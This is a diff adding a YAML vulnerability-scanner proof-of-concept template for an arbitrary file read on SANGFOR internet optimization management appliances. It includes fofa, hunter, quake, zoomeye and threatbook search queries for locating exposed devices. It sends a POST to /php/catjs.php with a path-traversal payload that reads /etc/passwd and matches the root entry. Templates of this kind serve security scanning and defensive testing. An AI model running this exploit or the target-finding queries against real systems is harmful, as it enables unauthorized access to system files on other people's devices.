@@ -1,0 +1,31 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: title="SANGFOR上网优化管理"
+    hunter-query: web.title=="SANGFOR上网优化管理"
+    quake-query: title:"SANGFOR上网优化管理"   
+    zoomeye-query: title:"SANGFOR上网优化管理"
+    threatbook-query: title="SANGFOR上网优化管理"
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-sangfor-sg-file-read
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /php/catjs.php
+      follow_redirects: false
+      body: |
+        ["../../../../../../../etc/passwd"]
+    expression: >-
+      response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+
+expression: r0() 
